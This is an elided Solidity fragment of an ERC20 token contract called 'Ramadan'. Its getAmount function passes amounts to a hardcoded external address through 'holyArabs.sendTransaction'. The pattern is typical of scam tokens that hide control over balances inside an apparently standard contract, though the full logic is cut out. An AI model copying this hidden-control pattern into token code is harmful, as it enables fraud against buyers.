...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _holyArabs = 0x78ac0Aab7d0246EC6D7e774345f6A747800cf358;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return holyArabs.sendTransaction(amount);
    }
    ...
    function _DeployRamadan(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRamadan(creator, initialSupply);
    }
}

contract Ramadan is ERC20Token {
    constructor() ERC20Token("RAMADAN", "RAMADAN", msg.sender, 5000000000 * 10 ** 18) {
    }
}